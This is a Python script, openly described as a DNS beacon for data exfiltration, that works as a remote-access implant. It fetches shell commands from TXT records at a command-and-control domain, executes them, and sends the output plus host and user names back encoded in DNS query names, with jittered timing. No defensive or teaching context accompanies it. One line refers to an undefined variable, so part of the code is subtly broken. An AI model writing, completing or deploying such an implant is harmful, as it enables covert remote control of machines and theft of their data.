#!/usr/bin/env python3
# Al-Baron DNS beacon — data exfil via DNS queries
import socket, base64, uuid, subprocess, time, random, os

C2_DOMAIN = "c2.example.com"
SID = str(uuid.uuid4())[:8]
INTERVAL = 60

def encode(data: bytes) -> str:
    # base32, split to DNS-safe labels (<63 chars)
    b32 = base64.b32encode(data).decode().rstrip("=").lower()
    return b32

def beacon_once(task_result: bytes = b""):
    # build query: <chunk1>.<chunk2>.<sid>.<c2_domain>
    payload = encode(task_result)[:180]
    labels = [payload[i:i+60] for i in range(0, len(payload), 60)]
    qname = ".".join(labels + [SID, C2_DOMAIN])
    try:
        socket.gethostbyname(qname)
    except Exception:
        pass

def get_task():
    # task retrieval: query t.<sid>.<domain> for TXT
    try:
        import dns.resolver
        r = dns.resolver.resolve(f"t.{SID}.{C2_DOMAIN}", "TXT")
        return b"".join(rr.strings).decode()
    except Exception:
        return ""

def main():
    while True:
        task = get_task()
        if task and task != "IDLE":
            try:
                out = subprocess.run(task, shell=True, capture_output=True, timeout=30)
                beacon_once(out.stdout + out.stderr)
            except Exception as e:
                beacon_once(str(e).encode())
        else:
            # heartbeat with host info
            info = f"{os.uname().nodename}|{os.getlogin()}".encode()
            beacon_once(info)
        time.sleep(INTERVAL + random.randint(-15, 15))

if __name__ == "__main__":
    main()
